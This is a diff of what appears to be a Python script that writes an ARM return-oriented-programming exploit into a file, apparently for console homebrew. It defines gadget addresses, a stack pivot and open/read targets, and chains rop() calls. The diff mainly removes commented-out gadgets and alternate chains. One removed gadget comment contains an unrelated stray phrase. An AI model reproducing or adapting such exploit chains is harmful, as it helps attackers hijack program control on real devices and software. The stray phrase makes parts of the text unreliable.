@@ -8,7 +8,7 @@ GARBAGE=0x44444444
 POPPC=0x00114aec
 POP_R0PC=0x0015be1c
 POP_R1PC=0x00151650
-POP_R0R4PC=0x0010974c #: pop {r0, r1, r2, r3, r4, pc}
+POP_R0R4PC=0x0010974c
 ROP_STR_R0TOR1=0x0013b098
 
 FILE=0x00230800
@@ -23,26 +23,11 @@ ARCH=0x0FFFFc46
 OPEN=0x001521f8+4
 READ=0x0011df78+4
 
-SP=0x0ffffcb8 # address of ropkit in bss
-#SP=ARCH-6
+SP=0x0ffffcb8 # address of initial rop on stack
 PC=POPPC
 
-READOP_FIX=0x00121c88
-TERM_FIX=0x0015b480
-#0x0015b480 : mov r0, #0 ; str r0, [r4] ; pop {r4, pc} ;
-#0x00121c88 : mov r1, #1 ; str r1, [r0] ; bx lr
-#0x00132d10 : mov r0, lr ; pop {r4, r5, r6, r7, r8, sb, sl, pc}
-#0x001469e0 : str lr, [r0, #0xc] ; pop {pc} "in deep development on a number of key projects"
-#0x0015e8a0 : str lr, [r0, #4] ; nop ; pop {r4, pc}
-#0x001007bc : ldmdb r6, {r0, r2, r5, r6, ip, sp, lr, pc} 
-
-
-'''
-with open("payload.bin","rb") as f:
-	ropkit=f.read()
-with open("otherapp.bin","rb") as f:
-	otherapp=f.read()
-'''
+READOP_FIX=0x00121c88 # : mov r1, #1 ; str r1, [r0] ; bx lr
+TERM_FIX=0x0015b480   # : mov r0, #0 ; str r0, [r4] ; pop {r4, pc} ;
 
 def write32(gadget_addr, file_offset):
 	global filename
@@ -112,22 +97,3 @@ rop(	DEST+0x2e0)
 rop(POP_R1PC)
 rop(	POPPC)
 rop(STACK_PIVOT)
-'''
-rop(POP_R0PC)
-rop(	FILENAME-4)
-rop(POP_R1PC)
-rop(	POPPC)
-rop(STACK_PIVOT)
-'''
-
-
-
-
-'''
-write32(LEVEL_ADDR, 0x1CC, "0a")
-
-write32(JUMP_ADDR, 0x1720, "0")
-write32(STACK_PIVOT, 0x171C, "0")
-write32(SP, 0x1738, "0")
-write32(PC, 0x1740, "0")
-'''
